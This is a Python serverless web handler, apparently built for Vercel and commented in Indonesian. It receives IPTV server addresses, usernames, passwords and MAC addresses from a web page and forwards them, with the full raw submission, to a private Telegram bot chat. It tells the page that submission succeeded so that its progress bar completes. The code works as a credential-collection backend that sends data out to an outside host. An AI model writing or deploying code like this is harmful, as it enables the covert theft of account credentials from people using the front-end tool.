import os, json, urllib.request, urllib.error
from http.server import BaseHTTPRequestHandler
from datetime import datetime

def tg(t, c, m):
    url = f"https://api.telegram.org/bot{t}/sendMessage"
    payload = json.dumps({"chat_id": c, "text": m}).encode('utf-8')
    r = urllib.request.Request(
        url, 
        data=payload, 
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(r, timeout=10) as response:
            return response.read()
    except urllib.error.HTTPError as e:
        error_message = e.read().decode('utf-8')
        raise Exception(f"Telegram API Error: {e.code} - {error_message}")

class handler(BaseHTTPRequestHandler):
    def log_message(self, f, *a): pass
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
        
    def do_POST(self):
        tk = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
        ci = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        
        if not tk or not ci:
            self.send_response(500)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"status":"error","message":"Konfigurasi Telegram kosong di Vercel"}')
            return

        try:
            # 1. Membaca paket data yang dikirim oleh web
            n = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(n).decode('utf-8') if n else "{}"
            d = json.loads(body)
            
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # 2. Ambil semua variasi nama parameter yang mungkin dikirim oleh web Anda
            server = d.get("server") or d.get("url") or d.get("portal_url") or d.get("host") or "-"
            username = d.get("username") or d.get("user") or "-"
            password = d.get("password") or d.get("pass") or d.get("pwd") or "-"
            mac = d.get("mac") or d.get("mac_address") or "-"
            
            # 3. Menyusun format laporan Telegram yang rapi dan fleksibel
            m = f"📡 [IPTV SCANNER LOG]\n"
            m += f"⏰ Waktu: {time_now}\n"
            m += f"🌐 Server/URL: {server}\n"
            
            # Hanya tampilkan baris USER jika ada datanya
            if username != "-":
                m += f"👤 User: {username}\n"
                
            # Hanya tampilkan baris PASS jika ada datanya
            if password != "-":
                m += f"🔑 Pass: {password}\n"
                
            # Hanya tampilkan baris MAC jika ada datanya (Khusus Mode Mac Portal)
            if mac != "-":
                m += f"💻 MAC: {mac}\n"
                
            # 4. TRICK CADANGAN: Tampilkan seluruh struktur JSON mentah dari web di bagian bawah
            # Ini menjamin jika ada tipe data baru, datanya TIDAK AKAN PERNAH hilang atau luput dari catatan
            m += f"\n📦 [Data Mentah Web]:\n{body}"
            
            # 5. Eksekusi pengiriman otomatis ke Telegram
            tg(tk, ci, m)
            
            # Berikan respon sukses ke frontend web agar progress bar web Anda berjalan sampai 100%
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
            
        except Exception as e:
            # Jika ada error sistem, catat juga ke Vercel log & Telegram jika memungkinkan
            print(f"CRITICAL_ERROR: {str(e)}")
            self.send_response(500)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            error_response = {"status": "error", "message": str(e)}
            self.wfile.write(json.dumps(error_response).encode('utf-8'))
